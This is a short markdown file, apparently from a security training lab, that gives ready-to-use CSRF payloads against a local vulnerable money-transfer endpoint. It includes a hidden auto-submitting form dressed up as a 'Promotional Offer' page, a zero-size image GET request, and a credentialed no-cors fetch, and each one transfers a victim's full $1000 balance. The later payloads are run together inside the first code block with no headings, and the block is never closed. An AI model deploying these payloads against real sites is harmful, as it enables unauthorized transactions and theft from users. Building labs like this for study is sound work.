# CSRF Payloads

The following payloads demonstrate different vectors to execute unauthorized actions against the vulnerable transfer endpoint.

> **Note:** Update the target URL/Port (e.g., `http://localhost:8080/transfer`) to match the local port assigned by `./start.sh`.

---

### Payload 1: Auto-Submitting POST Form (Standard CSRF)
This payload hosts a hidden HTML form configured to submit a transfer of the full balance ($1000) as soon as the document finishes loading.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Promotional Offer</title>
</head>
<body>
    <h1>Processing your request, please wait...</h1>
    <form id="csrfForm" action="http://localhost:8080/transfer" method="POST">
        <input type="hidden" name="amount" value="1000" />
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
<img src="http://localhost:8080/transfer?amount=1000" width="0" height="0" style="display:none;" />
<script>
    fetch('http://localhost:8080/transfer', {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'amount=1000'
    });
</script>
